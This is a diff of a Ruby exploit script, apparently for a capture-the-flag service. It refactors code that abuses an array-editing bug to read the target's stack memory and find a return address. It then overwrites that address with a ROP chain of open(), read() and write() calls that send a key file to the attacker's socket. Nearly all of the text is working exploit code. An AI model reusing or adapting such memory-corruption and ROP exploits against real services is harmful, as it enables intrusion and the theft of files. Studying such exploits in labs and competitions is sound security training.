@@ -102,7 +102,7 @@ def get(s, id)
   type = get_int(s)
   len = get_int(s)
 
-  puts("Retrieving #{len} bytes")
+  #puts("Retrieving #{len} bytes")
   data = s.recv(len)
 
   receive_code(s, 0x00001004, "get")
@@ -141,11 +141,16 @@ START_SEARCH   = 0xbf800000
 END_SEARCH     = 0xBFFFFFFF
 CHUNK_SIZE     = END_SEARCH - START_SEARCH
 
-PPPR = 0x2755
-PPR = 0x2756
-PR = 0x2757
+# Pop pop pop ret
+PPPR = 0x00002755
 
-def change_return_address(s, address_to_find, file_path, base, fd)
+# Pop pop ret
+PPR  = 0x00002756
+
+# Pop ret
+PR   = 0x00002757
+
+def find_return_address(s, address_to_find, file_path, base, fd)
   address_to_find = [address_to_find].pack("I")
 
   store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)
@@ -153,7 +158,6 @@ def change_return_address(s, address_to_find, file_path, base, fd)
 
   puts("Trying to read 0x%08x - 0x%08x..." % [START_SEARCH, END_SEARCH])
   edit_array(s, 1, 3, [START_SEARCH, CHUNK_SIZE / 4].pack("II"))
-
 
   out = [MESSAGE_GET, 0].pack("II")
   s.write(out)
@@ -163,47 +167,46 @@ def change_return_address(s, address_to_find, file_path, base, fd)
   result = ""
 
   while(result.length < len)
-    result = result + s.recv(100000)
-
-    if(!result.nil? && loc = result.index(address_to_find))
-      return_address = START_SEARCH + loc
-      puts("Found return address @ 0x%08x" % return_address)
-
-      puts("Attempting to ROP-read the key file...")
-      stack = [
-        base+0xc90, # open()
-        base+PPR,        # open return addr
-        file_path,  # filename = value we created
-        0,          # flags
-
-        base+0xb60, # read()
-        base+PPPR,
-        0,          # fd
-        file_path,  # buf
-        100,        # count
-
-        base+0xce0, # write()
-        base+PPPR,
-        fd,         # fd
-        file_path,  # buf
-        100,        # count
-
-        base+0x2350
-      ]
-
-      0.upto(stack.size - 1) do |i|
-        entry = [stack[i]].pack("I")
-        edit_array(s, 1, 3, [return_address - (i * 4), 1].pack("II"))
-        edit_array(s, 1, 3, [return_address + (i * 4), 1].pack("II"))
-        edit_array(s, 0, 0, entry)
-      end
-
-      return
+    result = result + s.recv(END_SEARCH - START_SEARCH + 1)
+    if(loc = result.index(address_to_find))
+      return START_SEARCH + loc
     end
   end
 
-  puts("Couldn't find return address :(")
+  puts("Couldn't find the return address :(")
   exit
+end
+
+def change_return_address(s, return_address, file_path, base, fd)
+
+    puts("Attempting to ROP-read the key file...")
+    stack = [
+      base+0xc90, # open()
+      base+PPR,        # open return addr
+      file_path,  # filename = value we created
+      0,          # flags
+
+      base+0xb60, # read()
+      base+PPPR,
+      0,          # fd
+      file_path,  # buf
+      100,        # count
+
+      base+0xce0, # write()
+      base+PPPR,
+      fd,         # fd
+      file_path,  # buf
+      100,        # count
+
+      base+0x2350
+    ]
+
+    0.upto(stack.size - 1) do |i|
+      entry = [stack[i]].pack("I")
+      edit_array(s, 1, 3, [return_address - (i * 4), 1].pack("II"))
+      edit_array(s, 1, 3, [return_address + (i * 4), 1].pack("II"))
+      edit_array(s, 0, 0, entry)
+    end
 end
 
 def get_base_address(s)
@@ -246,7 +249,10 @@ puts("... it's #{fd}!")
 address_to_overwrite = base_addr + 0x0e74
 puts("Searching the stack for 0x%08x" % address_to_overwrite)
 
-change_return_address(s, address_to_overwrite, file_path, base_addr, fd)
+return_address = find_return_address(s, address_to_overwrite, file_path, base_addr, fd)
+puts("Found return address @ 0x%08x" % return_address)
+
+change_return_address(s, return_address, file_path, base_addr, fd)
 
 puts("Quitting")
 quit(s)
